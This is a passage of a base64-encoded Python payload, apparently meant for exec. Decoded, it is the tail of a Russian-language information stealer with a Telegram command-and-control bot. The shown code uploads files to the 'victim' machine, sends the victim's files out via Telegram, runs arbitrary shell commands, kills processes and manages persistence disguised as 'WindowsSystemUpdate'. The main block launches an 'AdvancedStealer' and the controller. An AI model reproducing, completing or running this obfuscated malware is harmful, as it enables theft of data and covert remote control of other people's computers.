cCgpCiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKPue+4jyDQktGB0LUg0LzQvtC90LjRgtC+0YDRiyDQvtGB0YLQsNC90L7QstC70LXQvdGLISIpCgogICAgZGVmIHN0b3BfdmlydXNfY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+bkSAq0J7QodCi0JDQndCe0JLQmtCQINCS0JjQoNCj0KHQkC4uLioiKQogICAgICAgIHNlbGYuc3RvcF9hbGxfY29tbWFuZCgpCiAgICAgICAgdGltZS5zbGVlcCgyKQogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinIUg0JLQuNGA0YPRgSDQv9C+0LvQvdC+0YHRgtGM0Y4g0L7RgdGC0LDQvdC+0LLQu9C10L0g0Lgg0YPQtNCw0LvQtdC9INC40Lcg0L/QsNC80Y/RgtC4LiIpCiAgICAgICAgb3MuX2V4aXQoMCkKCiAgICBkZWYgaGFuZGxlX2ZpbGVfdXBsb2FkKHNlbGYsIGZpbGVfaW5mbywgZmlsZV9uYW1lKToKICAgICAgICAiIiLQntCx0YDQsNCx0LDRgtGL0LLQsNC10YIg0LfQsNCz0YDRg9C20LXQvdC90YvQuSDRhNCw0LnQuyIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgZmlsZV9jb250ZW50ID0gc2VsZi5kb3dubG9hZF9maWxlX2Zyb21fdGVsZWdyYW0oZmlsZV9pbmZvWyJmaWxlX2lkIl0pCiAgICAgICAgICAgIGlmIGZpbGVfY29udGVudDoKICAgICAgICAgICAgICAgIHN1Y2Nlc3MsIHJlc3VsdCA9IHNlbGYudXBsb2FkX2ZpbGVfdG9fdmljdGltKGZpbGVfY29udGVudCwgZmlsZV9uYW1lKQogICAgICAgICAgICAgICAgaWYgc3VjY2VzczoKICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShmIuKchSDQpNCw0LnQuyDRg9GB0L/QtdGI0L3QviDQt9Cw0LPRgNGD0LbQtdC9INC90LAg0YDQsNCx0L7Rh9C40Lkg0YHRgtC+0Ls6IGB7ZmlsZV9uYW1lfWAiKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShmIuKdjCDQntGI0LjQsdC60LAg0LfQsNCz0YDRg9C30LrQuCDRhNCw0LnQu9CwOiB7cmVzdWx0fSIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCd0LUg0YPQtNCw0LvQvtGB0Ywg0YHQutCw0YfQsNGC0Ywg0YTQsNC50Lsg0LjQtyBUZWxlZ3JhbSIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShmIuKdjCDQntGI0LjQsdC60LAg0L7QsdGA0LDQsdC+0YLQutC4INGE0LDQudC70LA6IHtzdHIoZSl9IikKCiAgICBkZWYgaGFuZGxlX2ZpbGVfZG93bmxvYWQoc2VsZiwgZmlsZV9wYXRoKToKICAgICAgICAiIiLQntCx0YDQsNCx0LDRgtGL0LLQsNC10YIg0LfQsNC/0YDQvtGBINC90LAg0YHQutCw0YfQuNCy0LDQvdC40LUg0YTQsNC50LvQsCIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZmlsZV9wYXRoKToKICAgICAgICAgICAgICAgIGZpbGVfbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUoZmlsZV9wYXRoKQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgICAgICBmaWxlX2NvbnRlbnQgPSBmLnJlYWQoKQogICAgICAgICAgICAgICAgaWYgbm90IHNlbGYuc2VuZF9kb2N1bWVudChmaWxlX2NvbnRlbnQsIGZpbGVfbmFtZSwgZiLwn5OBINCk0LDQudC7OiB7ZmlsZV9uYW1lfSIpOgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0J7RiNC40LHQutCwINC+0YLQv9GA0LDQstC60Lgg0YTQsNC50LvQsCIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShmIuKdjCDQpNCw0LnQuyDQvdC1INC90LDQudC00LXQvToge2ZpbGVfcGF0aH0iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiLinYwg0J7RiNC40LHQutCwINGB0LrQsNGH0LjQstCw0L3QuNGPINGE0LDQudC70LA6IHtzdHIoZSl9IikKCiAgICBkZWYgaGFuZGxlX3NoZWxsX2NvbW1hbmQoc2VsZiwgY29tbWFuZCk6CiAgICAgICAgIiIi0J7QsdGA0LDQsdCw0YLRi9Cy0LDQtdGCINC60L7QvNCw0L3QtNGDIHNoZWxsIiIiCiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChjb21tYW5kLCBzaGVsbD1UcnVlLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsIHRpbWVvdXQ9MzApLmRlY29kZSgnY3A4NjYnLCBlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKGYiYGBgXFxcXG57cmVzdWx0WzozNTAwXX1cXFxcbmBgYCIpCiAgICAgICAgZXhjZXB0IHN1YnByb2Nlc3MuVGltZW91dEV4cGlyZWQ6CiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0JrQvtC80LDQvdC00LAg0LLRi9C/0L7Qu9C90Y/Qu9Cw0YHRjCDRgdC70LjRiNC60L7QvCDQtNC+0LvQs9C+ICjRgtCw0LnQvNCw0YPRgiAzMCDRgdC10LrRg9C90LQpIikKICAgICAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3IgYXMgZToKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiLinYwg0J7RiNC40LHQutCwINCy0YvQv9C+0LvQvdC10L3QuNGPINC60L7QvNCw0L3QtNGLOiB7c3RyKGUpfSIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShmIuKdjCDQntGI0LjQsdC60LA6IHtzdHIoZSl9IikKCiAgICBkZWYgaGFuZGxlX2tpbGxfcHJvY2VzcyhzZWxmLCBwcm9jZXNzX2lucHV0KToKICAgICAgICAiIiLQntCx0YDQsNCx0LDRgtGL0LLQsNC10YIg0LfQsNCy0LXRgNGI0LXQvdC40LUg0L/RgNC+0YbQtdGB0YHQsCIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgcHJvY2Vzc19pbnB1dC5pc2RpZ2l0KCk6CiAgICAgICAgICAgICAgICAjINCt0YLQviBQSUQKICAgICAgICAgICAgICAgIHBpZCA9IGludChwcm9jZXNzX2lucHV0KQogICAgICAgICAgICAgICAgaWYgc2VsZi5wcm9jZXNzX21hbmFnZXIua2lsbF9wcm9jZXNzX2J5X3BpZChwaWQpOgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKGYi4pyFINCf0YDQvtGG0LXRgdGBINGBIFBJRCB7cGlkfSDQt9Cw0LLQtdGA0YjQtdC9IikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiLinYwg0J3QtSDRg9C00LDQu9C+0YHRjCDQt9Cw0LLQtdGA0YjQuNGC0Ywg0L/RgNC+0YbQtdGB0YEg0YEgUElEIHtwaWR9IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICMg0K3RgtC+INC40LzRjyDQv9GA0L7RhtC10YHRgdCwCiAgICAgICAgICAgICAgICBpZiBzZWxmLnByb2Nlc3NfbWFuYWdlci5raWxsX3Byb2Nlc3NfYnlfbmFtZShwcm9jZXNzX2lucHV0KToKICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShmIuKchSDQn9GA0L7RhtC10YHRgSBge3Byb2Nlc3NfaW5wdXR9YCDQt9Cw0LLQtdGA0YjQtdC9IikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiLinYwg0J3QtSDRg9C00LDQu9C+0YHRjCDQt9Cw0LLQtdGA0YjQuNGC0Ywg0L/RgNC+0YbQtdGB0YEgYHtwcm9jZXNzX2lucHV0fWAiKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiLinYwg0J7RiNC40LHQutCwINC30LDQstC10YDRiNC10L3QuNGPINC/0YDQvtGG0LXRgdGB0LA6IHtzdHIoZSl9IikKCiAgICBkZWYgaGFuZGxlX2NhbGxiYWNrKHNlbGYsIGNhbGxiYWNrX2RhdGEpOgogICAgICAgIGhhbmRsZXIgPSBzZWxmLmNvbW1hbmRzX2hhbmRsZXJzLmdldChjYWxsYmFja19kYXRhKQogICAgICAgIGlmIGhhbmRsZXI6CiAgICAgICAgICAgIGhhbmRsZXIoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0J3QtdC40LfQstC10YHRgtC90LDRjyDQutC+0LzQsNC90LTQsCIpCgogICAgZGVmIHN0YXJ0X2xpc3RlbmluZyhzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWFpbl9tZW51KCkKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB1cGRhdGVzID0gc2VsZi5nZXRfdXBkYXRlcygpCiAgICAgICAgICAgICAgICBmb3IgdXBkYXRlIGluIHVwZGF0ZXM6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5sYXN0X3VwZGF0ZV9pZCA9IHVwZGF0ZVsidXBkYXRlX2lkIl0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAjINCe0LHRgNCw0LHQvtGC0LrQsCBjYWxsYmFjayDQt9Cw0L/RgNC+0YHQvtCyICjQutC90L7Qv9C60LgpCiAgICAgICAgICAgICAgICAgICAgaWYgImNhbGxiYWNrX3F1ZXJ5IiBpbiB1cGRhdGU6CiAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrX2RhdGEgPSB1cGRhdGVbImNhbGxiYWNrX3F1ZXJ5Il1bImRhdGEiXQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmhhbmRsZV9jYWxsYmFjayhjYWxsYmFja19kYXRhKQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICMg0J7QsdGA0LDQsdC+0YLQutCwINGC0LXQutGB0YLQvtCy0YvRhSDRgdC+0L7QsdGJ0LXQvdC40LkKICAgICAgICAgICAgICAgICAgICBlbGlmICJtZXNzYWdlIiBpbiB1cGRhdGU6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSB1cGRhdGVbIm1lc3NhZ2UiXQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgIyDQntCx0YDQsNCx0L7RgtC60LAg0YTQsNC50LvQvtCyCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJkb2N1bWVudCIgaW4gbWVzc2FnZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYudXBsb2FkX21vZGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pbmZvID0gbWVzc2FnZVsiZG9jdW1lbnQiXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfbmFtZSA9IGZpbGVfaW5mby5nZXQoImZpbGVfbmFtZSIsICJ1cGxvYWRlZF9maWxlIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmhhbmRsZV9maWxlX3VwbG9hZChmaWxlX2luZm8sIGZpbGVfbmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnVwbG9hZF9tb2RlID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgIyDQntCx0YDQsNCx0L7RgtC60LAg0YLQtdC60YHRgtC+0LLRi9GFINC60L7QvNCw0L3QtAogICAgICAgICAgICAgICAgICAgICAgICBpZiAidGV4dCIgaW4gbWVzc2FnZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRleHQgPSBtZXNzYWdlWyJ0ZXh0Il0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGV4dCA9PSAiL21lbnUiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tYWluX21lbnUoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgdGV4dCA9PSAiL2V4aXQiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuc2hlbGxfbW9kZSA9IEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5kb3dubG9hZF9tb2RlID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnVwbG9hZF9tb2RlID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmtpbGxfbW9kZSA9IEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCflJkg0KDQtdC20LjQvNGLINC00LXQsNC60YLQuNCy0LjRgNC+0LLQsNC90YsiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgdGV4dCA9PSAiL3N0b3AiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuc3RvcF92aXJ1c19jb21tYW5kKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmIHNlbGYuc2hlbGxfbW9kZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmhhbmRsZV9zaGVsbF9jb21tYW5kKHRleHQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBzZWxmLmRvd25sb2FkX21vZGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5oYW5kbGVfZmlsZV9kb3dubG9hZCh0ZXh0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZG93bmxvYWRfbW9kZSA9IEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBzZWxmLmtpbGxfbW9kZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmhhbmRsZV9raWxsX3Byb2Nlc3ModGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmtpbGxfbW9kZSA9IEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiB0ZXh0LnN0YXJ0c3dpdGgoIi9jbWQgIik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5oYW5kbGVfc2hlbGxfY29tbWFuZCh0ZXh0WzU6XSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjINCV0YHQu9C4INC90Lgg0L7QtNC40L0g0YDQtdC20LjQvCDQvdC1INCw0LrRgtC40LLQtdC9LCDQv9C+0LrQsNC30YvQstCw0LXQvCDQvNC10L3RjgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4oS577iPINCY0YHQv9C+0LvRjNC30YPQudGC0LUg0LrQvdC+0L/QutC4INC80LXQvdGOINC00LvRjyDQstGL0LHQvtGA0LAg0LrQvtC80LDQvdC0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KGYi0J7RiNC40LHQutCwINCyINCz0LvQsNCy0L3QvtC8INGG0LjQutC70LU6IHtlfSIpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDUpCgpkZWYgcmVtb3ZlX2Zyb21fYXV0b3N0YXJ0KCk6CiAgICAiIiLQo9C00LDQu9GP0LXRgiDQuNC3INCw0LLRgtC+0LfQsNCz0YDRg9C30LrQuCIiIgogICAgdHJ5OgogICAgICAgIGtleSA9IHdpbnJlZy5PcGVuS2V5KHdpbnJlZy5IS0VZX0NVUlJFTlRfVVNFUiwgIlNvZnR3YXJlXFxcXFxcXFxNaWNyb3NvZnRcXFxcXFxcXFdpbmRvd3NcXFxcXFxcXEN1cnJlbnRWZXJzaW9uXFxcXFxcXFxSdW4iLCAwLCB3aW5yZWcuS0VZX1NFVF9WQUxVRSkKICAgICAgICB3aW5yZWcuRGVsZXRlVmFsdWUoa2V5LCAiV2luZG93c1N5c3RlbVVwZGF0ZSIpCiAgICAgICAgd2lucmVnLkNsb3NlS2V5KGtleSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICAKICAgIHRyeToKICAgICAgICBzdGFydHVwX2ZvbGRlciA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydBUFBEQVRBJ10sICdNaWNyb3NvZnQnLCAnV2luZG93cycsICdTdGFydCBNZW51JywgJ1Byb2dyYW1zJywgJ1N0YXJ0dXAnKQogICAgICAgIGJhdF9wYXRoID0gb3MucGF0aC5qb2luKHN0YXJ0dXBfZm9sZGVyLCAnd2luZG93c191cGRhdGUuYmF0JykKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhiYXRfcGF0aCk6CiAgICAgICAgICAgIG9zLnJlbW92ZShiYXRfcGF0aCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgcHJpbnQoIvCfmoAg0JDQmtCi0JjQktCQ0KbQmNCvINCg0JDQodCo0JjQoNCV0J3QndCe0JPQniDQodCi0JjQm9Cb0JXQoNCQLi4uIikKICAgIHN0ZWFsZXIgPSBBZHZhbmNlZFN0ZWFsZXIoKQogICAgc3RlYWxlci5ydW4oKQogICAgCiAgICBwcmludCgi8J+kliDQl9CQ0J/Qo9Ch0JogVEVMRUdSQU0g0JrQntCd0KLQoNCe0JvQm9CV0KDQkC4uLiIpCiAgICBjb250cm9sbGVyID0gVGVsZWdyYW1Db250cm9sbGVyKCkKICAgIHRlbGVncmFtX3RocmVhZCA9IFRocmVhZCh0YXJnZXQ9Y29udHJvbGxlci5zdGFydF9saXN0ZW5pbmcpCiAgICB0ZWxlZ3JhbV90aHJlYWQuZGFlbW9uID0gVHJ1ZQogICAgdGVsZWdyYW1fdGhyZWFkLnN0YXJ0KCkKICAgIAogICAgcHJpbnQoIuKchSDQodCY0KHQotCV0JzQkCDQkNCa0KLQmNCS0JjQoNCe0JLQkNCd0JAhINCe0LbQuNC00LDQvdC40LUg0LrQvtC80LDQvdC0Li4uIikKICAgIHByaW50KCLwn5uRINCU0LvRjyDQvtGB0YLQsNC90L7QstC60Lgg0L7RgtC/0YDQsNCy0YzRgtC1IC9zdG9wINCyIFRlbGVncmFtIikKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGltZS5zbGVlcCg2MCkK"))
